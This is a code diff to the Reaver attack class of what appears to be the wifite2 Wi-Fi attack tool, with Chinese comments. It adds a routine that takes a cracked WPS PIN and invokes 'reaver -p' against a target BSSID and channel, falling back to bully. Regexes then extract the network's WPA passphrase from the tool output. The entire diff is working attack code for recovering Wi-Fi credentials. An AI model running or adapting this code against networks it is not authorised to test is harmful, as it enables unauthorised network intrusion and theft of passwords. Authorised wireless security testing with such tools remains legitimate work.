@@ -214,16 +214,18 @@ class Reaver(Attack, Dependency):
             else:
                 self.pattack('{G}Cracked WPS PIN: {C}%s' % pin, newline=True)
 
-                # Try to derive PSK from PIN using Bully
-                self.pattack('{W}Retrieving PSK using {C}bully{W}...')
+                # Pixie-Dust 破出 PIN 后 reaver 通常不给 PSK（1.6.x）。
+                # 自动进行下一步：先用 reaver -p <pin> 在线取 PSK，再回退 bully。
+                # 捕获所有异常，避免 bully 未装/卡死导致整个 WPS 攻击崩溃。
+                self.pattack('{W}Retrieving PSK via {C}reaver -p{W}/{C}bully{W}...')
                 psk = None
                 try:
-                    psk = Bully.get_psk_from_pin(self.target, pin)
-                except KeyboardInterrupt:
-                    pass
+                    psk = Reaver.get_psk_from_pin(self.target, pin)
+                except Exception:
+                    psk = None
                 if psk is None:
                     Color.pl('')
-                    self.pattack('{R}Failed {O}to get PSK using bully', newline=True)
+                    self.pattack('{R}Failed {O}to get PSK (PIN saved, PSK N/A)', newline=True)
                 else:
                     self.pattack('{G}Cracked WPS PSK: {C}%s' % psk, newline=True)
 
@@ -394,6 +396,72 @@ class Reaver(Attack, Dependency):
                 ssid = regex.group(1)
 
         return (pin, psk, ssid)
+
+
+    @staticmethod
+    def get_psk_from_pin(target, pin, timeout=45):
+        '''用已知 PIN 通过 reaver -p <pin> 在线获取 WPA PSK。
+
+        Pixie-Dust 破出 PIN 后 reaver 通常不直接给 PSK（1.6.x）。
+        原版 wifite2 用 bully 回退；这里先用 reaver 自身（已确认安装），
+        再回退 bully，两路都带超时，避免卡死主流程。
+        返回 PSK 字符串或 None。
+        '''
+        # 1) reaver -p <pin>（已知 PIN 单次关联，比穷举快）
+        if Reaver.exists():
+            cmd = [
+                'reaver',
+                '-i', Configuration.interface,
+                '-b', target.bssid,
+                '-c', str(target.channel),
+                '-p', str(pin),
+                '-vv',
+            ]
+            try:
+                # 用 PIPE 捕获输出（不能用 devnull，否则拿不到 PSK 行）
+                proc = Process(cmd)
+                # 墙钟超时：reaver 拿到 PSK 会自行退出，否则中断
+                start = time.time()
+                while proc.poll() is None:
+                    if time.time() - start >= timeout:
+                        proc.interrupt()
+                        break
+                    time.sleep(0.3)
+                out = (proc.stdout() or '') + (proc.stderr() or '')
+                psk = Reaver._extract_psk(out)
+                if psk:
+                    return psk
+            except Exception:
+                pass
+
+        # 2) 回退 bully（原版 wifite2 路径）
+        try:
+            from .bully import Bully
+            if Bully.exists():
+                return Bully.get_psk_from_pin(target, pin)
+        except Exception:
+            pass
+        return None
+
+
+    @staticmethod
+    def _extract_psk(stdout):
+        '''从 reaver/bully 输出提取 WPA PSK。'''
+        if not stdout:
+            return None
+        # [+] WPA PSK: 'password'
+        m = re.search(r"WPA PSK:\s*'(.+?)'", stdout)
+        if m:
+            return m.group(1)
+        # bully: KEY: 'password'
+        m = re.search(r"^\s*KEY\s*:\s*'(.*)'\s*$", stdout, re.MULTILINE)
+        if m:
+            return m.group(1)
+        # [*] Pin is 'xxx', key is 'password'
+        m = re.search(r"key is '(.+?)'", stdout)
+        if m:
+            return m.group(1)
+        return None
 
 
     def get_output(self):
